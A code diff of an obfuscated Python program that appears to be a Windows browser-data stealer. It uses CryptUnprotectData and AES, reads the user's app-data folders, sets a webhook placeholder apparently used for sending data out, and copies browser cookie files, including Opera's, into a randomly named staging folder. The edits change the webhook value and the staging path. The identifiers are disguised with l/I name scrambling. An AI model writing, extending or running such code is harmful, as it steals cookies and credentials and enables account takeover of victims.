@@ -19,7 +19,7 @@ from shutil import copy2 as lIlIlllIIllIII, rmtree as lIIlIIllIlIIIl
 from Cryptodome.Cipher import AES as IlIllIIIIIlIII
 from win32crypt import CryptUnprotectData as IllIllIIlIlIll
 
-IIIllIIllIIlIlIlll = 'webhook here'
+IIIllIIllIIlIlIlll = 'ABC-WEBHOOKGOESHERE-CBA'
 
 def IlllIIIlIlIIllIlII():
     lIIllIlIIlIlIllIII = ''.join((IIllIllIIlllIl.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in lllllllllllllIl(IIllIllIIlllIl.randint(7, 13))))
@@ -27,7 +27,7 @@ def IlllIIIlIlIIllIlII():
 lllIIllllIlIIIlIll = lIIlIIlIIlIlII.getenv('LOCALAPPDATA')
 lIllIIIlllIIIIIIII = lIIlIIlIIlIlII.getenv('APPDATA')
 lIllIlllIllIlIIIll = IlllIIIlIlIIllIlII()
-lIIlIIIIllllIIIIIl = 'C:\\Users\\Public'
+lIIlIIIIllllIIIIIl = lIIlIIlIIlIlII.environ['LOCALAPPDATA']
 try:
     lIIlIIllIlIIIl(f'{lIIlIIIIllllIIIIIl}\\sycillia')
 except lllllllllllIlll:
@@ -131,7 +131,7 @@ def IlIlllllIIIIlllIIl(IlIlllIlIIlIlIlIIl: lllllllllllIlII, lllIllIIIIllllIlll: 
     if IlIlllIlIIlIlIlIIl in ['opera', 'opera-gx']:
         IIIlIlllIlIIIlIIIl = lllIllIIIIllllIlll + '\\Network\\Cookies'
     else:
-        IIIlIlllIlIIIlIIIl = f'{lllIllIIIIllllIlll}\\{llIlIIlllIIllIlllI}\\Network\\Cookies'
+        IIIlIlllIlIIIlIIIl = rf'{lllIllIIIIllllIlll}\\{llIlIIlllIIllIlllI}\\Network\\Cookies' # main path \\ profile \\ network \\ cookies
     if not lIIlIIlIIlIlII.path.isfile(IIIlIlllIlIIIlIIIl):
         return
     lIlIlllIIllIII(IIIlIlllIlIIIlIIIl, lIllIlllIllIlIIIll)
